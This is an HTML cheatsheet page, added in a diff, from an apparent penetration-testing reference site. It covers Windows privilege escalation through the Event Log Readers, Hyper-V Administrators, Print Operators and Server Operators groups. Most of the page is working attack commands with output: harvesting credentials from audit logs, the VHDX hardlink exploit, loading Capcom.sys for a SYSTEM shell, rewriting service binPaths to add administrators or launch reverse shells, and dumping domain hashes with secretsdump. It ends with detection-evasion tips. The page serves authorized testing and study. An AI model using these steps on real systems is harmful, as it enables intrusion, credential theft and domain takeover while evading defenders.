@@ -1,0 +1,422 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Other Privileged Groups · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Windows › Privilege Escalation</nav><h1>Other Privileged Groups</h1><p class="cx-lede">Four less-common but still tier-0-equivalent Windows groups - Event Log Readers (mine 4688 command-line audit logs for credentials in process arguments), Hyper-V Administrators (replace .vhdx with hardlink-to-protected-file for SYSTEM service hijack), Print Operators (SeLoadDriverPrivilege to load Capcom.sys for SYSTEM shellcode execution), and Server Operators (sc config binPath rewrite to make any service execute attacker commands as SYSTEM). Each group sits between standard user and Administrator on paper but maps to a SYSTEM-or-domain-admin path in practice.</p><div class="cx-tags"><span class="cx-tag">MITRE T1098, T1574, T1543.003, T1068, T1003</span><span class="cx-tag">D3FEND D3-PM, D3-LAM</span><span class="cx-tag">IMPACT PrivEsc, SystemCompromise, AdminCompromise, DomainCompromise</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Four built-in Windows groups grant escalation primitives that are easy to miss: <strong>Event Log Readers</strong> can read command-line audit logs that leak credentials passed as process arguments; <strong>Hyper-V Administrators</strong> can manipulate <code>.vhdx</code> files in ways the VMMS service mishandles, leading to SYSTEM; <strong>Print Operators</strong> hold <code>SeLoadDriverPrivilege</code> which loads the vulnerable <code>Capcom.sys</code> driver for SYSTEM shellcode execution; <strong>Server Operators</strong> have full control of every Windows service and can rewrite any service's <code>binPath</code> to execute attacker commands as SYSTEM.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Event Log Readers - mine 4688 events for credentials
+wevtutil qe Security /rd:true /f:text | findstr &quot;/user&quot;
+
+# Hyper-V Administrators - hardlink VHDX delete attack
+.\hyperv-eop.ps1     # decoder-it PoC
+
+# Print Operators - SeLoadDriverPrivilege + Capcom.sys
+EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys
+ExploitCapcom.exe
+
+# Server Operators - service binPath takeover
+sc config AppReadiness binPath= &quot;cmd /c net localgroup Administrators srv_adm /add&quot;
+sc start AppReadiness</code></pre></figure>
+<p>Success indicator: SYSTEM shell, new local admin user, or credentials extracted from audit logs.</p>
+<h2 id="event-log-readers">Event Log Readers</h2>
+<p>Members of <code>BUILTIN\Event Log Readers</code> can read the Windows event log, including the Security log where audit events live. The escalation surface depends on what's audited. When <strong>Audit Process Creation</strong> with <strong>Include command line in process creation events</strong> is enabled (event ID 4688), every process launch is logged with its full command line. Many Windows utilities accept credentials as arguments:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>net use T: \\fs01\backups /user:bjones MySecretP@ss
+schtasks /create /tn job /ru DOMAIN\svcacct /rp Pa$$word /tr cmd.exe
+runas /user:DOMAIN\admin /savecred cmd
+psexec.exe \\target -u admin -p Password cmd</code></pre></figure>
+<p>If any of these run periodically on the host (scheduled tasks, login scripts, vendor-installed services), their command lines sit in the Security log as plaintext credential leaks.</p>
+<h3 id="confirming-membership">Confirming membership</h3>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; whoami /groups | findstr &quot;Event Log Readers&quot;
+
+BUILTIN\Event Log Readers              Alias            S-1-5-32-573 Mandatory group, Enabled by default</code></pre></figure>
+<p>Or list members of the local group:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; net localgroup &quot;Event Log Readers&quot;
+
+Alias name     Event Log Readers
+Comment        Members of this group can read event logs from local machine
+
+Members
+
+-------------------------------------------------------------------------------
+logger</code></pre></figure>
+<h3 id="querying-the-security-log">Querying the Security log</h3>
+<p>Two interfaces: <code>wevtutil</code> (works from any context with Event Log Readers rights) and <code>Get-WinEvent</code> (PowerShell - but querying Security log via the PS cmdlet often requires additional permissions on the underlying registry key beyond Event Log Readers membership).</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; wevtutil qe Security /rd:true /f:text | findstr /i &quot;/user:&quot;
+
+        Process Command Line:   net use T: \\fs01\backups /user:bjones MySecretP@ss
+        Process Command Line:   schtasks /create /tn backupjob /ru DOMAIN\svc_backup /rp Backup2024! /tr &quot;robocopy ...&quot;</code></pre></figure>
+<p>The <code>qe</code> subcommand queries events; <code>Security</code> is the log name; <code>/rd:true</code> reads in reverse chronological order (newest first); <code>/f:text</code> formats as readable text. The pipe through <code>findstr</code> filters for credential indicators.</p>
+<h3 id="wider-credential-patterns">Wider credential patterns</h3>
+<p>Beyond <code>/user:</code> and <code>/password:</code>, useful filter patterns:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; wevtutil qe Security /rd:true /f:text | findstr /i &quot;password\|/pass:\|/pwd:\|/p:&quot;</code></pre></figure>
+<p>Vendor-specific patterns:</p>
+<ul>
+<li><code>sqlcmd.exe -S server -U user -P password</code></li>
+<li><code>osql.exe -E -S server</code> or <code>osql -U user -P password</code></li>
+<li><code>mysql.exe -u user --password=password</code></li>
+<li><code>psql.exe ... PGPASSWORD=...</code></li>
+<li><code>cmdkey /generic:target /user:user /pass:password</code></li>
+<li><code>mstsc.exe /v:target /u:user /p:password</code></li>
+</ul>
+<h3 id="targeting-remote-hosts">Targeting remote hosts</h3>
+<p><code>wevtutil</code> can query remote machines if the Event Log Reader rights are domain-pushed:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr &quot;/user&quot;</code></pre></figure>
+<p><code>/r:</code> specifies remote computer; <code>/u:</code> and <code>/p:</code> provide credentials for that connection.</p>
+<h3 id="powershell-variant">PowerShell variant</h3>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; Get-WinEvent -LogName security | Where-Object { $_.ID -eq 4688 -and $_.Properties[8].Value -like &#x27;*/user*&#x27; } | Select-Object @{name=&#x27;CommandLine&#x27;;expression={ $_.Properties[8].Value }}</code></pre></figure>
+<p>The 4688 event has the command line in property index 8 (zero-based). The filter restricts to events where that property contains <code>/user</code>. Note: this often requires admin context - Event Log Readers alone isn't always sufficient for <code>Get-WinEvent</code> against Security on modern Windows.</p>
+<h3 id="operational-scope">Operational scope</h3>
+<p>The credentials harvested by this method are whatever the host's audit log captured since the log rolled. Default Security log size is 20 MB on workstations and 128 MB on servers; busy hosts roll the log within hours, quiet hosts retain weeks of history. Run the harvest early in the engagement to maximize coverage.</p>
+<h2 id="hyper-v-administrators">Hyper-V Administrators</h2>
+<p><code>BUILTIN\Hyper-V Administrators</code> grants full management of Hyper-V VMs and virtual hard disks (<code>.vhdx</code> files). The escalation comes from how <code>vmms.exe</code> (the Hyper-V Virtual Machine Management Service) handles file operations on VHDX files - specifically the restore-permissions step on VM delete, which <code>vmms.exe</code> performs as SYSTEM without impersonating the caller.</p>
+<h3 id="the-attack">The attack</h3>
+<p>The pattern, originally documented by <a href="https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/">decoder-it</a>:</p>
+<ol>
+<li>Identify a target file owned by <code>TrustedInstaller</code> or another high-privilege principal that the operator wants to overwrite - typically a SYSTEM-context service binary the operator can later launch (e.g., <code>C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe</code>).</li>
+<li>Create a VM with a VHDX file at a path the operator controls.</li>
+<li>Delete the VHDX file from the filesystem.</li>
+<li>Create a hardlink at the VHDX path pointing to the target file.</li>
+<li>Trigger Hyper-V's "delete VM" operation. <code>vmms.exe</code> walks the VM's files and tries to restore default permissions on each - including the hardlinked path. Because it doesn't follow the hardlink correctly and operates as SYSTEM, the <em>target file</em> gets its ACL rewritten with the operator's user granted Full Control.</li>
+<li>The operator now has write access to the target service binary. Overwrite it with malicious code and trigger the service.</li>
+</ol>
+<h3 id="running-the-poc">Running the PoC</h3>
+<p><a href="https://github.com/decoder-it/Hyper-V-admin-EOP">decoder-it/Hyper-V-admin-EOP</a> contains a PowerShell PoC <code>hyperv-eop.ps1</code> that automates the hardlink-and-trigger steps.</p>
+<p>On unpatched hosts, <strong>CVE-2018-0952</strong> and <strong>CVE-2019-0841</strong> give the same group an alternate route: both are arbitrary-DACL / file-write-as-SYSTEM flaws (in the Diagnostics Hub and AppX deployment services respectively) that a Hyper-V Administrator can leverage to overwrite a SYSTEM-owned file and reach SYSTEM without the VHDX hardlink dance. Check the patch level before assuming the hardlink path is the only option.</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; .\hyperv-eop.ps1</code></pre></figure>
+<p>After execution, the target file's ACL grants the current user Full Control. Take ownership and overwrite:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; takeown /F &quot;C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe&quot;
+C:\&gt; copy /Y malicious.exe &quot;C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe&quot;
+C:\&gt; sc.exe start MozillaMaintenance</code></pre></figure>
+<p>The maintenance service runs as SYSTEM and is startable by unprivileged users, so the malicious binary executes as SYSTEM.</p>
+<h3 id="service-binary-selection">Service binary selection</h3>
+<p>Any service binary running as SYSTEM with a non-protected binary path and a start trigger accessible to the operator works. Common candidates:</p>
+<ul>
+<li><strong>Mozilla Maintenance Service</strong> - <code>MozillaMaintenance</code> service, runs as SYSTEM, startable by users when Firefox is installed</li>
+<li><strong>Google Update Service</strong> - <code>gupdate</code> / <code>gupdatem</code>, similar properties when Chrome is installed</li>
+<li><strong>Adobe Updater</strong> - when Adobe products are installed</li>
+</ul>
+<p>Verify the service's start permissions before counting on it:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; sc sdshow MozillaMaintenance</code></pre></figure>
+<p>Look for the user's SID with <code>RP</code> (SERVICE_START) rights.</p>
+<h3 id="patch-status">Patch status</h3>
+<p>This vector was mitigated by Windows security updates in March 2020, which changed how hard links are handled by VMMS. On fully-patched current Windows it doesn't work. On Server 2016 / 2019 deployments that haven't received the March 2020 quality rollup it still does. Verify patch level first:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; wmic qfe list brief | findstr 2020</code></pre></figure>
+<p>KBs from March 2020 or later mitigate the issue. If the host's hotfixes are older, the vector is viable.</p>
+<h3 id="alternative-virtual-dc-clone">Alternative - virtual DC clone</h3>
+<p>If the host runs a virtualized Domain Controller, Hyper-V Administrators can clone the running VM, mount the cloned VHDX offline, and copy out <code>NTDS.dit</code> and the registry hives without any of the diskshadow / SeBackupPrivilege machinery. The clone process doesn't trigger Windows DC-protection signals because it operates at the hypervisor level. This is the canonical reason "virtualization admins should be treated as Domain Admins" - they can extract the AD database without any AD-visible action.</p>
+<h2 id="print-operators">Print Operators</h2>
+<p><code>BUILTIN\Print Operators</code> grants <code>SeLoadDriverPrivilege</code>, the right to load kernel drivers. Together with <code>SeShutdownPrivilege</code> (also held) and login-locally-to-DC rights, this group is functionally equivalent to local SYSTEM on a DC.</p>
+<p>The escalation primitive: load the <code>Capcom.sys</code> driver (a Capcom-shipped, legitimately-signed driver that contained a deliberate kernel-shellcode-execution function - originally a Capcom anti-cheat mechanism, accidentally a textbook privesc) and use its functionality to execute attacker shellcode in kernel context.</p>
+<h3 id="confirming-the-privilege">Confirming the privilege</h3>
+<p>From a default cmd shell, <code>whoami /priv</code> may not show <code>SeLoadDriverPrivilege</code> because UAC restricts the displayed privileges to those active in the current token. Open an elevated cmd via Run-as → enter Print Operators member credentials, then check again:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State
+============================= ==================================  ==========
+SeMachineAccountPrivilege     Add workstations to domain           Disabled
+SeLoadDriverPrivilege         Load and unload device drivers       Disabled
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled</code></pre></figure>
+<p><code>SeLoadDriverPrivilege</code> is held but Disabled. The exploit tooling enables it programmatically.</p>
+<h3 id="loading-capcomsys">Loading Capcom.sys</h3>
+<p>The driver location lookup goes through <code>HKCU\System\CurrentControlSet</code> rather than <code>HKLM\System\CurrentControlSet</code> - this is the trick that makes Print Operators able to load drivers without registry write to HKLM (which they don't have). The Windows driver load API consults the per-user registry root when called from a user-mode process holding <code>SeLoadDriverPrivilege</code>.</p>
+<p>Add the registry pointers:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d &quot;\??\C:\Tools\Capcom.sys&quot;
+The operation completed successfully.
+
+C:\&gt; reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
+The operation completed successfully.</code></pre></figure>
+<p>The <code>\??\</code> prefix is an NT Object Manager path used by the driver loader - required syntax, not optional.</p>
+<p>Drop <code>Capcom.sys</code> to the path specified (<code>C:\Tools\Capcom.sys</code>). The driver is available from various sources including <a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">the original Capcom repository</a>.</p>
+<h3 id="enabling-the-privilege-and-loading">Enabling the privilege and loading</h3>
+<p>The <a href="https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp">EnableSeLoadDriverPrivilege</a> tool enables the privilege and calls <code>NtLoadDriver</code> against the registered key:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; EnableSeLoadDriverPrivilege.exe
+
+whoami:
+EXAMPLE\printsvc
+
+whoami /priv
+SeMachineAccountPrivilege        Disabled
+SeLoadDriverPrivilege            Enabled
+SeShutdownPrivilege              Disabled
+SeChangeNotifyPrivilege          Enabled by default
+SeIncreaseWorkingSetPrivilege    Disabled
+NTSTATUS: 00000000, WinError: 0</code></pre></figure>
+<p><code>NTSTATUS: 00000000</code> (zero is success) confirms the driver loaded. Verify with a driver-listing tool:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; .\DriverView.exe /stext drivers.txt
+PS&gt; cat drivers.txt | Select-String -pattern Capcom
+
+Driver Name           : Capcom.sys
+Filename              : C:\Tools\Capcom.sys</code></pre></figure>
+<h3 id="exploiting-the-loaded-driver">Exploiting the loaded driver</h3>
+<p>With Capcom.sys loaded, use <a href="https://github.com/tandasat/ExploitCapcom">ExploitCapcom</a> to invoke the driver's IOCTL that executes attacker shellcode in kernel mode. The default ExploitCapcom payload steals the SYSTEM token and assigns it to a <code>cmd.exe</code>:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; .\ExploitCapcom.exe
+
+[*] Capcom.sys exploit
+[*] Capcom.sys handle was obained as 0000000000000070
+[*] Shellcode was placed at 0000024822A50008
+[+] Shellcode was executed
+[+] Token stealing was successful
+[+] The SYSTEM shell was launched</code></pre></figure>
+<p>A new console window opens running as SYSTEM.</p>
+<h3 id="non-interactive-variant">Non-interactive variant</h3>
+<p>For non-RDP contexts, modify ExploitCapcom's source (line 292) to launch a reverse shell binary instead of <code>cmd.exe</code>:</p>
+<figure class="cx-code"><figcaption>c</figcaption><pre><code class="language-c">TCHAR CommandLine[] = TEXT(&quot;C:\\ProgramData\\revshell.exe&quot;);</code></pre></figure>
+<p>Generate the revshell with msfvenom, drop to <code>C:\ProgramData\</code>, recompile ExploitCapcom, run it. The shellcode now spawns the reverse shell with the stolen SYSTEM token; the listener catches a SYSTEM shell.</p>
+<h3 id="automation-eoploaddriver">Automation - EoPLoadDriver</h3>
+<p><a href="https://github.com/TarlogicSecurity/EoPLoadDriver/">EoPLoadDriver</a> handles the privilege-enable, registry-add, and driver-load steps in one binary:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys
+
+[+] Enabling SeLoadDriverPrivilege
+[+] SeLoadDriverPrivilege Enabled
+[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
+NTSTATUS: c000010e, WinError: 0</code></pre></figure>
+<p><code>NTSTATUS: c000010e</code> is <code>STATUS_IMAGE_ALREADY_LOADED</code> - the driver is already loaded from a previous run. Either status (success or already-loaded) means proceed to <code>ExploitCapcom.exe</code>.</p>
+<h3 id="cleanup">Cleanup</h3>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; reg delete HKCU\System\CurrentControlSet\Capcom
+Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Y
+The operation completed successfully.</code></pre></figure>
+<p>Driver unload requires SYSTEM context - but the operator now has it.</p>
+<h3 id="patch-mitigation-status">Patch / mitigation status</h3>
+<p>Since Windows 10 Version 1803, <code>NtLoadDriver</code> no longer resolves <code>\??\&lt;path&gt;</code> references through <code>HKEY_CURRENT_USER</code> - the registry key must live under <code>HKEY_LOCAL_MACHINE</code>, which Print Operators can't write. On 1803+ this specific Capcom path doesn't work directly.</p>
+<p>Workarounds:</p>
+<ul>
+<li>On Print Operators contexts on older Windows (Server 2016 RTM, 1709, Windows 7/Server 2008/R2) the technique still works as documented</li>
+<li>Other vulnerable signed drivers exist for newer Windows; the technique generalizes to "load a known-vulnerable signed driver via SeLoadDriverPrivilege"</li>
+<li><code>KDU</code> (Kernel Driver Utility) maintains a catalog of vulnerable signed drivers usable for kernel-mode escalation</li>
+</ul>
+<h2 id="server-operators">Server Operators</h2>
+<p><code>BUILTIN\Server Operators</code> is the highest-impact of the four groups. Members can:</p>
+<ul>
+<li>Log on locally to Domain Controllers</li>
+<li>Manage services on the host (start, stop, <em>and reconfigure</em>)</li>
+<li>Back up and restore files (holds <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>)</li>
+<li>Format the hard drive</li>
+<li>Shut down the system</li>
+</ul>
+<p>The service-reconfiguration right is the easy path: rewrite any service's <code>binPath</code> to run an attacker command, restart the service, the command executes as SYSTEM.</p>
+<h3 id="confirming-membership_1">Confirming membership</h3>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; whoami /groups | findstr &quot;Server Operators&quot;
+
+BUILTIN\Server Operators               Alias            S-1-5-32-549 Mandatory group, Enabled by default</code></pre></figure>
+<h3 id="picking-a-target-service">Picking a target service</h3>
+<p>Any service running as <code>LocalSystem</code> works. The <code>AppReadiness</code> service is a common pick because it's always present, infrequently used, and so its temporary failure doesn't break anything critical.</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; sc qc AppReadiness
+
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: AppReadiness
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : App Readiness
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem</code></pre></figure>
+<p><code>SERVICE_START_NAME: LocalSystem</code> confirms the service runs as SYSTEM. <code>START_TYPE: 3 DEMAND_START</code> means it's not started automatically - the operator starts it on demand to trigger the payload.</p>
+<h3 id="confirming-server-operators-rights-on-the-service">Confirming Server Operators rights on the service</h3>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; PsService.exe security AppReadiness
+
+PsService v2.25 - Service information and configuration utility
+Copyright (C) 2001-2010 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+SERVICE_NAME: AppReadiness
+DISPLAY_NAME: App Readiness
+        ACCOUNT: LocalSystem
+        SECURITY:
+        [ALLOW] NT AUTHORITY\SYSTEM
+                Query status
+                ...
+        [ALLOW] BUILTIN\Administrators
+                All
+        [ALLOW] NT AUTHORITY\INTERACTIVE
+                ...
+        [ALLOW] NT AUTHORITY\SERVICE
+                ...
+        [ALLOW] BUILTIN\Server Operators
+                All</code></pre></figure>
+<p><code>BUILTIN\Server Operators: All</code> is the indicator - <code>SERVICE_ALL_ACCESS</code>, including the right to change the binary path.</p>
+<h3 id="rewriting-binpath">Rewriting binPath</h3>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; sc config AppReadiness binPath= &quot;cmd /c net localgroup Administrators server_adm /add&quot;
+
+[SC] ChangeServiceConfig SUCCESS</code></pre></figure>
+<p>The space after <code>binPath=</code> is required - <code>sc</code> parses key=value with a literal space separator. Without the space, <code>sc</code> reports a syntax error.</p>
+<p>The command can be anything:</p>
+<ul>
+<li>Add a user to local admins: <code>cmd /c net localgroup Administrators newuser /add</code></li>
+<li>Add a domain user to local admins: <code>cmd /c net localgroup Administrators DOMAIN\user /add</code></li>
+<li>Add to Domain Admins (only from a DC): <code>cmd /c net group "Domain Admins" newuser /add /domain</code></li>
+<li>Run a reverse shell binary: <code>cmd /c c:\windows\temp\rev.exe</code></li>
+<li>Add a scheduled task: <code>cmd /c schtasks /create /tn persist /tr c:\windows\temp\implant.exe /sc onlogon /ru SYSTEM</code></li>
+</ul>
+<h3 id="starting-the-service">Starting the service</h3>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; sc start AppReadiness
+
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.</code></pre></figure>
+<p>The service fails to start - that's expected. The <code>binPath</code> no longer points at a service binary, so the SCM can't establish a service-control connection. But before that failure happens, the SCM executed the command as SYSTEM. Verify:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; net localgroup Administrators
+
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+Domain Admins
+Enterprise Admins
+server_adm                                        ← new
+The command completed successfully.</code></pre></figure>
+<p><code>server_adm</code> is now local Administrator. From there:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ nxc smb 10.0.43.9 -u server_adm -p &#x27;Welcome1!&#x27;
+
+SMB         10.0.43.9     445    DC01      [*] Windows 10.0 Build 17763
+SMB         10.0.43.9     445    DC01      [+] EXAMPLE.LOCAL\server_adm:Welcome1! (Pwn3d!)</code></pre></figure>
+<h3 id="composing-to-domain-compromise">Composing to domain compromise</h3>
+<p>If the target service runs on a DC (Server Operators can log on to DCs by default), local admin on the DC enables NTDS.dit dump via <code>secretsdump.py</code>:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ secretsdump.py server_adm@10.0.43.9 -just-dc-user administrator
+
+Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
+...</code></pre></figure>
+<p>Pass-the-hash with the Administrator NT hash gives unconstrained domain access.</p>
+<h3 id="cleanup_1">Cleanup</h3>
+<p>Restore the original binPath and start the service properly:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; sc config AppReadiness binPath= &quot;C:\Windows\System32\svchost.exe -k AppReadiness -p&quot;
+[SC] ChangeServiceConfig SUCCESS
+
+C:\&gt; sc start AppReadiness</code></pre></figure>
+<p>If the new admin user was created, remove it:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; net localgroup Administrators server_adm /delete</code></pre></figure>
+<h2 id="operational-considerations-across-all-four-groups">Operational considerations across all four groups</h2>
+<h3 id="stealth-ranking">Stealth ranking</h3>
+<p>Roughly in order from quietest to loudest:</p>
+<ol>
+<li><strong>Event Log Readers</strong> - read-only operation. No state changes. Only telemetry is event-log-read events (4798/4799), which are rarely audited.</li>
+<li><strong>Hyper-V Administrators</strong> - file operations on VHDX, VM management API calls. Visible to Hyper-V audit logs but rarely correlated with privesc.</li>
+<li><strong>Print Operators</strong> - driver load is a kernel-level operation logged extensively (Sysmon event 6, security event 4697 for new services). Capcom.sys specifically is signatured by EDR.</li>
+<li><strong>Server Operators</strong> - service-configuration changes generate event 7040 (service start type changed) and event 7045 (new service installed if binPath rewrite is treated as such). Highly visible.</li>
+</ol>
+<h3 id="detection-evasion-strategies">Detection-evasion strategies</h3>
+<ul>
+<li>For Server Operators specifically, restore the original <code>binPath</code> immediately after the failed start - the audit log records both the change and the restore, but a casual review may see only the original config.</li>
+<li>For Hyper-V, perform the action during scheduled maintenance windows when VM operations are expected.</li>
+<li>For Print Operators, use a less-signatured vulnerable driver than Capcom.sys (the <a href="https://github.com/hfiref0x/KDU">KDU catalog</a> lists alternatives).</li>
+<li>For Event Log Readers, the read pattern itself is normal admin behavior; no special evasion needed beyond avoiding obvious filter patterns.</li>
+</ul>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Group</th>
+<th>Primitive</th>
+<th>Key command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Event Log Readers</td>
+<td>Audit log mining</td>
+<td><code>wevtutil qe Security /rd:true /f:text \| findstr "/user:"</code></td>
+</tr>
+<tr>
+<td>Event Log Readers</td>
+<td>Remote query</td>
+<td><code>wevtutil qe Security /r:HOST /u:USER /p:PASS /f:text</code></td>
+</tr>
+<tr>
+<td>Hyper-V Admins</td>
+<td>VHDX hardlink → service binary takeover</td>
+<td><code>.\hyperv-eop.ps1</code></td>
+</tr>
+<tr>
+<td>Hyper-V Admins</td>
+<td>Verify patch level</td>
+<td><code>wmic qfe list brief \| findstr 2020</code></td>
+</tr>
+<tr>
+<td>Hyper-V Admins</td>
+<td>DC virtualization clone</td>
+<td>Hyper-V console → clone running DC VM → mount cloned VHDX offline</td>
+</tr>
+<tr>
+<td>Print Operators</td>
+<td>Load Capcom.sys (manual)</td>
+<td><code>reg add HKCU\System\CurrentControlSet\CAPCOM</code> + <code>EnableSeLoadDriverPrivilege.exe</code></td>
+</tr>
+<tr>
+<td>Print Operators</td>
+<td>Load Capcom.sys (automated)</td>
+<td><code>EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys</code></td>
+</tr>
+<tr>
+<td>Print Operators</td>
+<td>Verify driver loaded</td>
+<td><code>DriverView.exe /stext drivers.txt \| Select-String Capcom</code></td>
+</tr>
+<tr>
+<td>Print Operators</td>
+<td>Execute SYSTEM payload</td>
+<td><code>ExploitCapcom.exe</code></td>
+</tr>
+<tr>
+<td>Print Operators</td>
+<td>Modern alternative</td>
+<td>KDU + alternative vulnerable signed driver</td>
+</tr>
+<tr>
+<td>Server Operators</td>
+<td>Find target service</td>
+<td><code>sc qc AppReadiness</code> - confirm <code>SERVICE_START_NAME: LocalSystem</code></td>
+</tr>
+<tr>
+<td>Server Operators</td>
+<td>Verify rights</td>
+<td><code>PsService.exe security SERVICENAME</code></td>
+</tr>
+<tr>
+<td>Server Operators</td>
+<td>Rewrite binPath (add admin)</td>
+<td><code>sc config SVC binPath= "cmd /c net localgroup Administrators USER /add"</code></td>
+</tr>
+<tr>
+<td>Server Operators</td>
+<td>Rewrite binPath (revshell)</td>
+<td><code>sc config SVC binPath= "cmd /c C:\Windows\Temp\rev.exe"</code></td>
+</tr>
+<tr>
+<td>Server Operators</td>
+<td>Trigger</td>
+<td><code>sc start SVC</code> (will fail; payload runs anyway)</td>
+</tr>
+<tr>
+<td>Server Operators</td>
+<td>Restore</td>
+<td><code>sc config SVC binPath= "ORIGINAL_PATH"</code></td>
+</tr>
+<tr>
+<td>Server Operators → DC compromise</td>
+<td>After local admin on DC</td>
+<td><code>secretsdump.py USER@DC -just-dc</code></td>
+</tr>
+</tbody>
+</table>
+<p>For other privilege/group escalation paths in this cluster, see <a href="../backup-operators/index.html">Backup Operators</a>, <a href="../dnsadmins/index.html">DnsAdmins</a>, <a href="../seimpersonate/index.html">SeImpersonate</a>, <a href="../sedebugprivilege/index.html">SeDebugPrivilege</a>, <a href="../setakeownership/index.html">SeTakeOwnership</a>. For OS-level escalation paths (UAC bypass, weak service ACLs, kernel exploits) and credential hunting techniques, see subsequent rounds.</p></article><nav class="cx-pager"><a class="cx-prev" href="../dnsadmins/index.html">Previous: DnsAdmins</a><a class="cx-next" href="../weak-permissions/index.html">Next: Weak Service &amp; Registry Permissions</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
